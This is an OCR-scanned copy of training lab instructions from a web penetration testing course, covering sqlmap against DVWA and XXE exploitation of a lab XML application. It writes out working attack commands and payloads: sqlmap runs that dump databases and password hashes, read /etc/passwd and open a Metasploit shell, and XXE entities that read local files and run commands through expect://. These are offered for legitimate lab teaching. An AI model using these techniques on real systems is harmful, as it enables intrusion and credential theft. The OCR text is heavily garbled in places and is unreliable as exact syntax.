SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 3.5: sqlmap + ZAP 
sqlmap with --cookie 
'--' 
Let's use those yummy cookies ... 
'-J 
You will use the previously copied cookie to allow sqlmap to test the authenticated SQLi vulnerability 
located here: http:// dvwa/vulnerabili ties/ sqli/? id=l&Submi t=Submi t 
Open a terminal. 
Warning: For the next command, be sure to supply your previously copied cookie value in place of the 
PASTE COPIED DATA HERE. 
In the terminal, type the following command, which is all one single line: 
$ sqlmap -u 11http://dvwa/vulnerabilities/sqli/?id=l&Submit=Submit11 
--cookie="PASTE COPIED DATA HERE" --proxy http://localhost:8081 
- -batch 
Warning: Quotes around the URL are required in this case due to the"&". 
Note: The PHPSESSID you use will be different than the one in the following image: 
r T 
Terminal 
- + 
X 
View 
Temooal 
TabSc 
!-lei 
[ 
$ sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=l&Submit=Submit" 
- - cookie= 
11 PHPSESS ID=94auavu 13vd4c6g lnav9in 70u3; security= Low" - -proxy 
ttp://localhost:8081 --batch 
Review the output to find the answer to the next question. 
'-./ 
'-J 
'--' 
'--' 
'-..., 
'-..., 
'-..., 
'-..., 
'--' 
'-..., 
'----' 
'----' 
'----' 
"--· 
'-./ 
'-./ 
'---' 
'-./ 
'-..., 
'-./ 
,_,, 
'--' 
'-' 
'----' 
'-./ 
'-- 
'----' 
'---' 
'----' 
'----' 
'-- 
'----' 
'-..., 
'----' 
'----' 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 3.5: sqlmap + ZAP 
'-../ 
'-..., 
sqlmap SQLi Methods 
What methods does sqlmap find are available to attack the vulnerable id parameter? 
In the results of our previous command, sqlmap lists four types of injections available against the 
vulnerable id parameter. 
The four types are: 
• 
Boolean-based blind 
• 
Error-based 
• 
UNION query 
• 
AND/OR time-based blind 
Parameter: id (GET} 
11· 
Type: boolean-based blind 
.· • 
Title: AND boolean-based blind - WHERE or HAVING clause 
Payload: id=l' AND 5881=5881 AND 'DTbO'='DTbO&Submit=Submit 
fl 
Type: error-based 
Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause 
Payload: id=l' AND (SELECT 6437 FROM(SELECT COUNT(*),CONCAT(0x7176717871,(SELECT (CASE W 
~EN (6437=6437) THEN 1 ELSE 0 END)),0x716b626271,FLOOR(RAND(0)*2))x FROM INFORMATION SCHEMA. 
ICHARACTER_SETS GROUP BY x)a) AND 'eQbT'='eQbT&Submit=Submit 
Type: UNION query II 
Title: MySQL UNION query (NULL) 
- 2 columns 
Payload: id=l' UNION ALL SELECT NULL,CONCAT(0x7176717871,0x62474a685751506a4a50,0x716b62 
1627l)#&Submit=Submit 
Type: AND/OR time-based blind II 
Title: MySQL > 5.0.11 AND time-based blind 
Payload: id=l' AND SLEEP{S) AND 'vKbO'="vKbO&Submit=Submit 
Note: The order these types appear can vary. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 3.5: sqlmap + ZAP 
sqlmap User Agent 
'--' 
Now, let's check out the default sqlmap user agent, and then customize it. 
Double-click any sqlmap HTIP request found in ZAP's History. Hint, the sqlmap requests will all list 
http:/ /dvwa: 80 rather than just http:/ /dvwa under the URL in the History tab. 
On the Request tab, find the default user agent: 
GET http://dvva:80/vulnerabilities/sq1i/?id..,l&SUb1it=SUbmit HTTP/1.l 
Connection: close 
Accept: */* 
User-Agent! sqlaap/1.1.1. 2Gldev {http://sqlaap.org) 
Cookie: PI-FSESSID=iuigdn4850b7n6ilc5sk7bqle5; security=lov 
cache-control: no-cache 
Host: dvwa 
We can see above that the default user agent at lab creation was sqlmap/1.1.1. 2 O#dev 
(http://sqlmap.org) 
Back in the terminal, we will execute sqlmap to use a custom user agent of 42 so as to not make 
immediately obvious we are running sqlmap. 
'---' 
'-.../ 
'--' 
'-.../ 
,._____,, 
'-.../ 
'-" 
,._____,, 
'-.../ 
'-.../ 
'--./ 
'-' 
'-' 
'-' 
'-../ 
'-' 
'-' 
'-../ 
''--./ 
,._____,, 
,._____,, 
Hint: The up arrow will save you a lot of typing because we will just tweak previous commands with much 
of this exercise. 
$ sqlmap -u 11http://dvwa/vulnerabilities/sqli/?id=l&Submit=Submit" 
-cookie="COOKIE VALUE11 
---proxy http://loc.albost: 8081 -::'".batch -·.:.user- 
42 
$ sqlmap -u 11http://dvwa/vulnerabilities/sqli/?id=l&Submit=Submit11 
--cookie="COOKIE VALUE" --proxy http://localhost:8081 --batch 
--user-agent 42 
Note: The above is a single command on one line. 
Back in ZAP: Check ZAP History to confirm that the UA changed successfully. 
'--' 
'-../ 
,._____,, 
'--' 
'-' 
'-../ 
'-' 
'-' 
'-../ 
'-../ 
'-../ 
,._____,, 
'-../ 
luser
1
- A.gent: ~2 I 
'-' 
'-" 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 3.5: sqlmap + ZAP 
'--' 
'-' 
'-J 
Database Names and Tables 
First, generate a list of database names. The --dbs flag enumerates DBMS databases. 
Execute the following command: 
$ sqlmap -u 
11http://dvwa/vulnerabilities/sqli/?id=l&Submit=Submit11 
--cookie="COOKIE VALUE" --proxy http://localhost:8081 --batch 
--µser-agenti,42 --dbs 
You should see output like the following: 
[ 12.: 31: 
l [ 
] 
available databases (14): 
[*l bWAPP 
[*] drupal 
[*] drupal7 
[*] dvwa 
[*] information schema 
[*] my_wiki 
[*] mysql 
[*] nowasp 
[*I perform,rnce_schema 
[*] phpbb3 
[*] snort 
[*) sqli 
[*] webcalendar 
[ *] wordpress 
se names 
A number of databases are available. We'll look at the my_ wiki database passwords shortly, but will 
focus on the sqli database now. 
Now that we know the sqli database exists, let's list the tables. The -D flag selects the database and the 
- - tables flag enumerates the database tables. 
" 
Remove - -dbs from the previous command and replace it with -D sqli - - tables: 
$ sqlmap -u 11http://dvwa/vulnerabilities/sqli/?id=l&Submit=Submit11 
--cookie=11COOKIE VALUE" --proxy http://localhost:8081 --batch 
--user-agent 42 -D sqli --tables 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 3.5: sqlmap + ZAP 
There are two tables: Customers and Users: 
'--..I 
} 
[ 
Database: sqli 
[2 tables] 
+-----------+ 
I Customers I 
I Users 
I 
+-----------+ 
.,__, 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'--" 
'-' 
'-' 
'-' 
'-' 
'-' 
'---" 
'-' 
'-' 
'---" 
'-' 
'-' 
'--..I 
'-.J 
'-.J 
'--" 
'-' 
'-' 
'---" 
'-' 
'-' 
'--" 
'-' 
'-' 
'-' 
'-' 
.,__, 
'-' 
\,__,, 
'-' 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 3.5: sqlmap + ZAP 
'--" 
'-' 
'-' 
Sensitive Table Entries 
We often interact with applications that store sensitive data. Although the organization is interested in 
~ 
learning about potential impact to the data, it might balk at you disclosing, even to yourself. 
One way around this issue is to perform an action indicating that you could have exfiltrated the data. 
Counting the rows in a table can work well for this. 
To that end, count the number of entries in the Customers table of the sqli database. 
Execute the following command: 
$ sqlmap -u 11http://dvwa/vulnerabilities/sqli/?id=l&Submit=Submit11 
--cookie="COOKIE VALUE" --proxy http://localhost:8081 --batch 
-use.r-agent 42< 
.. --D sqri -T Customers - -oount; 
As shown in the following screenshot, we count 56 entries in the sqli. Customers table. 
Database: sqli 
+-----------+---------+ 
I Table 
I Entries I 
+-----------+---------+ 
I Customers I 
+-----------+---------+ 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 3.5: sqlmap + ZAP 
zbeeblebrox uid 
'----' 
The goal of this task is to determine the uid associated with the zbeeblebrox account on the victim 
system. This information would be contained in / etc/password, so we will steal that file. 
Execute the following command at the terminal prompt: 
$ sqlmap -u 11http://dvwa/vulnerabilities/sqli/?id=l&Submit=Submit11 
- -cookie=11COOKIE.< ... VALUE11 
- -proxy http:/ /localhost: 8081 - -batch 
--user-agent 42 --file-read /etc/passwd 
Note that rather than displaying the information, sq I map writes the file locally here: 
/home/student/.sqlmap/output/dvwa/files/ etc_passwd. 
1files saved to [1]: 
[*] /home/student/.sqlmap/output/dvwa/files/ etc passwd (same file) 
Let's grep for the target entry by running the following command: 
...__; 
'-../ 
'-../ 
'-../ 
'-../ 
'-../ 
'---' 
'---' 
'-" 
'---' 
'----' 
'-../ 
'-../ 
'---' 
'----' 
$ grep zbeeblebrox /home/student/.sqlmap/output/dvwa/files/_etc_passwd 
'-,/ 
'----' 
'-" 
'-,/ 
V 
File 
sswd - 
ash 
\..._./ 
'---' 
'-" 
\..._./ 
'---' 
We find a uid of 1003 for zbeeblebrox. 
'----' 
\..._./ 
\..._./ 
\..._./ 
\..._./ 
'-" 
'-" 
\..._./ 
'----' 
\..._./ 
'---' 
'-" 
'-.../ 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 3.5: sqlmap + ZAP 
'---' 
'-.../ 
'-.../ 
DB Users and Passwords 
Dump the DB users and passwords by appending - -users - -passwords to the base sqlmap 
command we have been using. Execute the following at a terminal prompt: 
$ sqlmap -u 11http://dvwa/vulnerabilities/sqli/?id=l&Submit=Submit11 
--cookie=f1COOKIE VALUE" --proxy http://localhost:8081 --batch 
-a,gent 42 --users --passwords 
Press Ctrl-C to quit the password cracking that automatically starts with our running in batch mode. 
Below, we see the database users on the system: 
[23:30:32] [INFO) fetching database users 
database management system users [6]: 
[*] 
1debian-sys-maint1@1localhost1 
[*] 
'drupal7'@1localhost1 
[*] 
'root1@'127.0.0.1' 
[ *] ' root 
1@' : : 1 ' 
[*] 
1root1@1localhost
1 
[*] 
'root'@'ubuntu' 
We also see their password hashes, just waiting for cracking: 
database management system users password hashes: 
[*] debian-sys-main
.~t • 
...,ruiili,1.1_
: 
_ 
password hash: *992B89066D80745163BF9828B1CBE9F7F2ECD1AE 
[*] drupal7 [1]: 
password hash: *2CAB1C0BB01BDEE1CFB157535AE9E788C3A96603 
[ *] root [ 1 l : 
password hash: *2CAB1C0BB01BDEE1CFB157535AE9E788C3A966D3 
Notice anything suspicious about root and drupal's password hashes? They seem to be the same, which 
would suggest that these hashes are unsalted. Googling for unsalted hashes can work pretty well. The 
number of characters in the hash suggests SHA-1. Unsalted SHA-1 should be fun. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 3.5: sqlmap + ZAP 
my_wiki Password Search 
'-.../ 
'-.../ 
Determine the name of the column and table that contain password hashes for the my_ wiki database. 
'-' 
We want to search for columns associated with passwords, but only for the my_ wiki database. The 
- - search operator is what we need, but we will need to limit it to only my_ wiki and search for column 
names that include pass. 
So, to the base command (see below), we append - -search -D my _wiki -c pass 
Base sqlmap command line: 
$ sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=l&Submit=Submit" 
cookie="COOKIE VALUE" --proxy http://localhost:8081 --batch --user-agent 
42 
Updated command line: 
$ sqlmap -u 11http://dvwa/vulnerabilities/sqli/?id=l&Submit=Submit11 
--cookie="COOKIE VALUE" --proxy http://localhost:8081 --batch 
--user-agent 42 --search -D my_wiki -C pass 
The following screenshot suggests the user _password field of the user table of my_ wiki is our target. 
'-' 
..._., 
..._., 
..._., 
'-' 
..._., 
·-._,/ 
'-' 
'-' 
'-../ 
'-' 
'-' 
'-' 
'- 
'-' 
'-./ 
Database: my_wiki 
Table: user 
[2 entries] 
+-------------------+------------------+----------------------------------------------+ 
I user_newpass_time I user_newpassword I user_password 
+-------------------+------------------+----------------------------------------------+ 
I NULL 
I <blank> 
I 
:B:e80ee467:lb4685756c78da009bdd2a38bc4bl54f I 
I NULL 
I <blank> 
I 
:B:86fe19d2:8aac12b3192cec40f83abfaalcfe332a I 
+- - - - - - - - - - - - - - - - - - -+- - - - - - - - - - - - - - - - - -+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -+ 
'-' 
'-' 
'-' 
..._., 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
..._., 
'-' 
---- 
..._., 
..._., 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 3.5: sqlmap + ZAP 
'-' 
'-' 
'-....,, 
Bonus: MSF Shell 
Your bonus goal is to get an MSF shell using sqlmap and then determine the uid of the account running 
your shell. The hint at the bottom of the slide indicates that some non-default responses will be required. 
We will need to remove the - -batch switch. Help or memory will suggest two additional switches are 
needed to attempt an MSF shell: - -os-pwn and - -msf-path. 
Bonus command notes: 
Warning: First be sure to "cd / opt/metasploi t- framework" (due to Metasploit's Ruby version 
dependencies). 
Warning: Be sure to remove" - -batch" if you are editing your previous command (the command will fail 
otherwise). 
Type the following: 
cd /opt/metasploit-framework 
sqlmap -u 0http://dvwa/vulnerabilit'es/sqli/?id=l&Submit=S 
OOKIE V'. 
o 
. : //loc~l 
/metasploit-fr 
Press <Enter> in response to "which web application language does the web server support?" 
[21:46:39] 
[INFO] fingerprinting the back-end DBMS operating 
[21:46:39] [WARNING] reflective value{s) found and filtering 
;[21:46:39] [INFO] the back-end DBMS operating system is Linu 
I [ 2~: 46: 39 l [ IN~O 1 ~oing to use a web backdoo r to establish t 
1which web application language does the web server s.upport7 
[11 ASP 
[21 ASPX 
[3] JSP 
[4] PHP (default) 
:> II 
Enter "2" in response to "what do you want to use for writable directory?" 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 3.5: sqlmap + ZAP 
..___,, 
[21:47:31] 
[WARNING] unable to automatically retrieve the 
1b server document root 
iwhat do you want to use for writable directory? 
j[l] common location(s) {'/var/WWW/, /var/WWW/html, /usr/loca 
l/apache2/htdocs, /var/www/nginx-default1 /srv/www1) {defaut 
t) 
[2] custom location(s) 
t
, [3] custom directory list file 
J brute force search 
~I"'--
' 
, 
_ 
-.._.I 
'--' 
,/ 
'--" 
'-..J 
'--" 
'--" 
'-.../ 
'--" 
'--" 
Enter /var/www/dvwa in response to "please provide a comma separate list of absolute directory 
paths:" 
21:48: 
server "'"''-""'"'· 
t do you want to use for writable directory? 
J common location(s) (1/var/www/, /var/WWW/html, /usr/local/apache2/htdocs, /var/ 
. 
/nginx-default, /srv/www') (default) 
1[21 custom \oc:ation(s) 
l[3J custom directory list file 
I [ 4J brute force search 
i> 2 
!please pro\l~de a comma SE!parate list of absolutedirectory paths: 
Press <Enter> for all remaining options: 
• which connection type do you want to use? <Enter> 
• what is the local address? [Enter for '127.0.0.1' 
(detected)] <Enter> 
• which local port number do you want to use? [XXXXX] 
<Enter> 
• which payload do you want to use? <Enter> 
• what is the back-end database management system architecture? <Enter> 
Type id when the Metasploit shell starts: 
'----' 
'-./ 
'-./ 
'-" 
'--" 
'-" 
'--" 
'---' 
'--" 
'---' 
'-" 
'---' 
'-..J 
'---' 
'-..J 
'---' 
'-.../ 
'-" 
'---' 
[*] Starting the payload handler ... 
(21:58:02] [INFO] running Metasploit Framework shellcode remotely via shetlcodeexec, 
please wait., 
[*] Sending stage (36 bytes) to 127.0.0.1 
[*] Command shell session 1 opened {127.0.0.1:45327 -> 127.0.0.1:49555) at 2018-01-1 
7 21:50:03 -0800 
id 
uid=33{ww..1-data) gid=33(www-data} groups=33(www-data) 
,·.~ 
'-./ 
'---' 
'--/ 
'---' 
'--" 
'--" 
'-..J 
'--./ 
Feel free to type other shell commands. 
'---' 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 3.5: sqlmap + ZAP 
'-../ 
'-' 
, 
== - 
~ 
- 
- 
--- -~ 
- 
~ 
-- 
_ -~-; - 
_ - 
--_ - Ex.Jiirneise/4.1 - !fXXE - ~ -- 
·:--=- - 
~ ~ 
- 
~-=--::.. 
-~ 
:;:. 
- 
- 
::~ 
~ 
, 
"~_ 
==- 
"'-:: 
= 
_---::::.._- 
=~=- 
" 
I Objectiv~s 
• 
• 
Gain hands-on experience with XXE (XML external entities) 
Leverage XXE flaws to perform the following steps: 
o 
Display the contents of a variable 
o 
Display a local file 
o 
Surf to a URL and display the results 
o 
Perform Remote Code Execution (RCE) 
I Lab Description 
Your client has hired you to perform a crystal-box (full-knowledge) test vs. an XML application available 
via http://sec542.org/guide/ and shown here: 
The client has chosen the crystal-box (full-knowledge) test because the page uses two PHP scripts, and 
"view source" will not work on those (the code is executed by the server, and not sent to the browser). 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.1: XXE 
1 
'-.J 
The application works like this (all files are in http://www.sec542.org/guide/): 
'-.J 
index.html 
POST Data 
entry.php 
POST XML 
Return data 
xml.php 
\......, 
'-' 
'-../ 
'-../ 
'-' 
Note that Burp Suite and ZAP will see the interaction between index.html and entry.php (because that 
data will pass through the interception proxy), but they will not see the interaction between entry.php 
and xml.php (that data is sent server-> server). 
Here is the XML design that matches the screenshot above: 
<?xml version=11l.011?> 
<entry> 
<subject>Earth</subject> 
<category>Planets</category> 
<text>Mostly harmless.</text> 
</entry> 
!challenge: No Hints 
• 
Manually use the application at http://www.sec542.org/guide/index.html and determine what the 
expected application output looks like 
• 
Perform the following exploits vs. the XML application at http://www.sec542.org/guide/xml.php: 
1. 
Use curl to send the XML content shown above with no modification to 
http://www.sec542.org/guide/xml.php, and verify you are able to send data directly to the 
XML parser and that the response appears accurate 
2. 
Use an XML external entity to display text of your choice via one of the XML fields 
3. 
Use an XML external entity to display a local file such as /etc/passwd 
4. 
Use an XML external entity to surf to another URL that contains text, such as 
http://sec542.org/robots.txt 
5. 
Use an XML external entity to run the 'id' command (or any command of your choice) 
• 
You may flip back through the lecture and base your answers on the previous examples. Note that the 
XML values have changed and will need to be adjusted 
• 
The directory /home/student/Desktop/XXE contains the XML used in the previous section 
'--" 
'-' 
'-' 
'-' 
'-.J 
....__,, 
'----' 
'-...,/ 
'----' 
'--' 
-._,., 
'----' 
'-" 
'--' 
'--' 
'--' 
'----' 
'--' 
'-' 
'--' 
'--' 
'--" 
'--,/ 
'--,/ 
A step-by-step walkthrough begins on the next page. 
'--,/ 
Choose your own difficulty! 
'--' 
'-...,/ 
'--,/ 
'-...,/ 
'-" 
'----' 
'-...,/ 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.1: XXE 
2 
'-..../ 
'-..../ 
'--' 
!step-by-Step Instructions 
Note: If you get stuck and want to check your work, answer XML files are contained in 
/home/student/Desktop/XXE/answers/. 
That directory also contains curl scripts to run the proper syntax for each step. For example: 
/home/student/Desktop/XXE/answers/curll.sh will send guidel.xml, etc. 
Setup: First, manually use the application at http://www.sec542.org/guide/index.htm1 and 
determine what the expected application output looks like. 
Open Firefox and go to Exercises Tool bar -> XXE (http:/ /www.sec542.org/guide/). 
Ill, Advanced username Hal'\16ting 
IIBASE 
Et BeEF Control ?anel 
B Blind SQt Injection 
-, Dn.Jpal 
~ Heartbleed 
B HTIP Request t Response 
I' Mutillidae 
ilil'phpbb 
JU. phpMyAdmin 
Bsnake 
II Shelishock Netstat.cgi 
B SQt Injecticm 
II user Account Harve~ing 
B web Authentication - Bask: 
B• Web AUthentication - 
II Web Authentication • forms 
II• Web Calendar 
B Wo,dpress Admin 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.1: XXE 
3 
Enter data in the three fields and press "submit": 
You should see the following output: 
1. 
Use curl to send the XML content shown above with no modification to 
http://www.sec542.org/guide/xml.php, and verify you are able to send data directly to the XML 
parser and that the response appears accurate 
Open a terminal and type: 
$ gedit /home/student/guidel.xml 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.1: XXE 
'-' 
'-' 
'--' 
'-" 
'-' 
'-../ 
'-" 
'-" 
'-' 
'-' 
'-' 
'-..../ 
'-' 
'-..../ 
'-' 
'-' 
'-' 
'-' 
'-..../ 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-..../ 
'-' 
'-' 
'-' 
'-..../ 
'-..../ 
'-' 
'-..../ 
'-../ 
'-../ 
'-' 
'-..../ 
'--' 
4 
'-..../ 
'-' 
'-..../ 
Then enter the following XML data: 
<?xml version="l.0"?> 
<entry> 
<subject>Earth</subject> 
<category>Planets</category> 
<text>Mostly harmless.</text> 
</entry> 
~?xml version"'"1.0''?> 
-<entry> 
<subject>Earth<isubject> 
<category>?lanets</category> 
<text>Hostl.y harmless,</text> 
<jentry> 
Lrt 1,Col1 
Save the file. We will keep gedit open, and edit our existing file for upcoming challenges. 
Then open another terminal and type the following curl command to send the XML file to xml.php: 
$ curl -d@/home/student/guidel.xml http://sec542.org/guide/xml.php 
Tl!l'll'ltffll 
K~~'~"w,,-~C•c• 
"""'._~,.~ 
- 
![-)$ curl -d@/home/student/guidel. xml http:/ /sec542. orgJguide/xml. php 
iThank you for your Hitchhiker's Guide to the GalaXXE Submission! !<bT><br>Your en 
itry:<!)r><br>Subject: Earth<br>Category: Planets<br>Text: Mostly harmless .<br> 
ll-1$ I 
! 
2. Use an XML external entity to display text of your choice via one of the XML fields 
Use gedit to edit /home/student/guidel.xml and change it to the following: 
<?xml version="l.011?> 
<!DOCTYPE foo [ 
<!ELEMENT foo ANY> 
<!ENTITY xxe "gargle blaster">]> 
<entry> 
<subject>&xxe;</subject> 
<category>Planets</category> 
<text>Mostly harmless.</text> 
</entry> 
SE 542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.1: XXE 
5 
< xml vers ron=e r. 0"?> 
< OOCTYPE i'oo [ 
< ELEMEfff roe ANY > 
< ENTITY xxe ·•gargle blaster" ::, ]> 
<entry> 
<subject:>&xxe:~/subject> 
<Category>Planets.;:/category> 
<text>Mostly harmless.</text> 
</entry> 
We want to save copies of our previous XML files, so be sure to use File-> Save As-> 
/home/student/guide2.xml 
Then type the following curl command in a different terminal to send the XML file to xml.php: 
$ curl -d@/home/student/guide2.xml http://sec542.org/guide/xml.php 
[-]$ curl -d@/home/student/guide2. xml http:/ /sec542, org/guide/xml. php 
hank you for your Hitchhiker• s Guide to the GalaXXE Submission! !<br><hr>Your en 
try:<br><br>Subject: gargle blaster<br>Category: Planets<br>Text: Mostly harmles 
S,<br> 
3. 
Use an XML external entity to display a local file such as /etc/passwd 
Use gedit to edit /home/student/guide2.xml and change this line: 
<!ENTITY xxe "gargle blaster">]> 
Change it to: 
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]> 
<?xr:l versfon::·"1.8''?> 
<!DOCTYPE foo ( 
,; ! ELEMENT foo ANY > 
•:!ENHTY xxe SYSTEM 
•·fii.e;/1/etc/passw~· >J:, 
-eenrrv» 
<Subject:,r-,xxe;<isutlj ec t> 
<ca1egory>Planets</<:ategory.,, 
<te~t>Mostly ha,mless.</text> 
</entry> 
Use File -> Save As-> /home/student/guide3.xml 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.1: XXE 
\_,, 
\._I 
'--' 
'--' 
'-../ 
'-../ 
'-' 
'-' 
'-../ 
'-../ 
'-../ 
'-../ 
'-' 
'-../ 
'-../ 
'-../ 
.__., 
'-/ 
'-' 
'-../ 
'-' 
'-../ 
\_,, 
'-/ 
'-../ 
'-../ 
'---' 
'---' 
'-../ 
'-/ 
'-../ 
'---' 
'-../ 
v 
'-J 
'-'. 
'-../ 
'-/ 
'-../ 
'-../ 
6 
'-../ 
'---' 
'-./ 
Then type the following curl command in a different terminal to send the XML file to xml.php: 
$ curl-d@/home/student/guide3.x.mlhttp://sec542.org/guide/xml.php 
lillit Vi©N w,mina! Tu. tt,;p 
curC:d@/home/student/guide3 .·xml http: I tsec542. org/guide/xml, pllp 
you for your !litchhiker's Guide to the GalaXXE Submission! !<llr><llr>Your en 
ry:<:br><br>Subject: root:x:0:0:rnot:/root:/bio/bash 
aemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
in:x:2:2:bin:/bin:/usr/sbin/nologio 
sys:x:3:3:sys:/rJev:/usr/sbin/nologin 
sync:x:4 :65534: sync :/bin :/bin/sync 
ames:x:5:66:games:/usr/games:/usr/sbin/nologin 
an:x:6:12:man:/var/cache/man:/usr/sbin/nologin 
tp:x:7:7:lp:/var/spool/lpd:/usr/sb:l.n/nologin 
an:x :6: 8 :mail: /var/mail: /usr/sbHl/nol.ogin 
ews :x :9;9 :news:/var/spoot/news :/Usr/s,bin/nologin 
ucp: x: 18: 18: uucp :/var/spoottuucp:/usr/sbin/nologin 
roxyrx: 13: 13: proxy: /bin: /usr/sbin/nologin 
tw• data: x: 33: 33: w,A<Hlata :. /var /mN; /us,r /sllin/nologin 
acl\Up:x:34: 34: backup: /var/backups: /usr/sbin/notogin 
list :x:38:38 :Mailing List Ma nag.er :/var/Ust: /usr/sbin/notogin 
"rc:x:39:39:ircd:/var/run/ircd:/usr/sbintnologin 
nat.s :x:41 :41: Gnats Bug-Reporting System {admin) :/11ar/Ub/g.nats:/usr/sbin/nolQg11 
obody: x: 65534: 65534: nobody: /nonexr s tent : /usr/sbin/nolog:in 
ibuuid:x: li:18: 181: :/var/Ub/libuuid: 
systog,:x: Hll: 184: :/home/syslog,:/bin/fatse 
essagebus:x: 182: 186:: /var/ run/deus :/bin/fa he 
sbmux:x: 183:46:usbmmt daemon,,, :/home/usbmux:/bin/false 
nsmasq :x: 184; 65534:dnsmasq•,,, ;/var/lib/misc :/bin/false 
vahi-autoipd: x: 105: 113: Ava hi autoip daemon,,,: Nar/Ub/avahi-autoipd: /bJn/talse; 
kernoops :x: 106: 655.34: Kernel Oops Tracking Daemon,..,:/ :/bin/false 
! 
rtkit :x: HJ7: 114:RealtimeKit,,, :/proc:/bin/folse 
aned r x: 188: US:: /home/saned :/bin/false 
noops re :x: Hl9: 116: : /nonexistent :/bin/false 
speech-dispatcher:x:110:29:Speech Oispat(her,,,:/var/rnn/speech-d:l.spatcher:/bin/ 
sh 
vahi:x:111:117:Avahi mOHS daemon,,, :/var/nm/avahi-daemon:lbin/fatse 
ightdm:x: 1.12: 118: Light Display Manager:Nar/lib/lightdm:/bin/false 
olord:x: 113: 121: co lord colour management daemon,,, :/VM'/lib/colord: /bin/false 
pUp;x: 114:7:HPLIP system user,,,: /var/nm/hpUp:/bin/false 
u\se:x: US: 1Z2: PulseAudio daemon,,,: /Var/run/pulse: /bin/false 
student: x: Hl00: 1880: Student,.,, ;Jhome/s.tudimt: /bin/bash 
ysqt • x: 116: 125: r4ySQL Server,,, : /nenexrs tent : /bin/false 
ostfix:x: 117: 126; :/var/spool/posttix:/bin/talse 
ostg.res :x; 116: 128:PostgreSQL admi.nistrator,,, :/var/Uh/postgresql:/bin/bash 
shd': x: 119:65534: : /var/run/sshd: tusr/sbin/nologin 
ind :x: 120: 129:: /var /cache/bind: /bin/false 
dent:x:1002:16()2:Arthur Oent,,,:/horne/adent:/bin/hasll 
zbeeblebrnx:x: 1093: Hl03: Zaphod Beeblebrox,,,: /home/zbeeblebrox: /bin/bash 
fprefect: x: 1984: 1884: Ford Prefect,,,: /home/tpretect: /bin/bash 
mcmiUan:x:1885:1005:Tricia "Trillian• McMillan,,, :/llome/tmcmillan:/bin/bash 
j on.es: x: 1086: 1006: Howard Jones, , , : /hom.e/hj ones: /l>in/l>ash 
lsmHh:x:1.007:1807:Lisa Jane SMith,,, :/home/tsmith:/bin/bash 
mt-n.et: x: 121: 130:; /home/uml- net: /bin/talse 
br:,.Category: Planets<br>1ext: Mostly harmtess.<br> 
1-1$ I 
4. 
Use an XML external entity to surf to another URL that contains text, such as 
http://sec542.org/robots.txt 
Use gedit to edit /home/student/guide3.xml and change this line: 
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]> 
Change itto: 
<!ENTITY xxe SYSTEM "http://sec542.org/robots.txt" >]> 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4,1: XXE 
7 
<?:i::1l v1r~ion::.• 1. 8"?> 
": DOCT'r'l'E foo [ 
-< l ELEfo!EHT fco ANY ,. 
</EUTITY xxe SYSTEM 
Mhttp://e>ec,42.,c,rQ/robots,txt· >]> 
ii 
- 
!:.:-tntqr:.. 
.. tsubje,t>&x,i:,~; </-subject> 
«c ,, tegor ,- .. Planl!!t$</ ca tego r:,'> 
,·h:>it>,.ostly han:ale-ss.</text:> 
</flntry=- 
Use File-> Save As-> /home/student/guide4.xml 
Then type the following curl command in a different terminal to send the XML file to xml.php: 
$ curl -d@/home/student/guide4.xml http://sec542.org/guide/xm1.php 
I [- J $ curl -d©/home/student/guide4. xml http:/ /sec542. o rg/guide/x.ml. php 
1Thank you for your Hitchhiker's Guide to the GalaXXE Submission!!<br><br>Your en 
ry :<br><br>Subject: User-a,gent: * 
isallow: /cgi-bin/ 
isal low: /admin 
isallow: /sensitive 
br>Category: Planets<br>Text: Mostly harmless.<br> 
5. 
Use an XML external entity to run the 'id' command (or any command of your choice) 
Use gedit to edit /home/student/guide4.xml and change this line: 
<!ENTITY xxe SYSTEM "http://sec542.org/robots.txt" >]> 
Change it to: 
<!ENTITY xxe SYSTEM "expect://id" >]> 
foe AflY 
SYSTEH 
Use File-> Save As-> /home/student/guideS.xml 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.1: XXE 
'-.../ 
'-.../ 
'-' 
'-" 
'-" 
'-" 
'-' 
'--' 
\.,_,; 
'--' 
'-.J 
'---' 
\.,_,; 
'-' 
'-...,,' 
'-' 
'--' 
'-" 
'-" 
'-' 
'-' 
"-"' 
'-' 
'-- 
\.,_,; 
'-' 
'-" 
'-" 
'--' 
\.,_,; 
'--' 
'-" 
\.,_,; 
'-' 
'-' 
\,_,, 
8 
'-' 
'-' 
Then type the following curl command in a different terminal to send the XML file to xml.php: 
$ curl -d@/home/student/guideS.xml http://sec542.org/guide/xml.php 
[ -]$. curl -d@/liome/student/guide5 .. xml http://sec:542.org/guide/xml. php 
hank you for your Hitchhiker's Guide to, the GalaJ<XE Submission! !<br><br>Your en 
ry: <br><br>Subject: uid=33(www-data) g,id""33{ww,,,Hiata) groups""33(www-data) 
br>Category; Planets<br>Text: Mostly harmless.<br> 
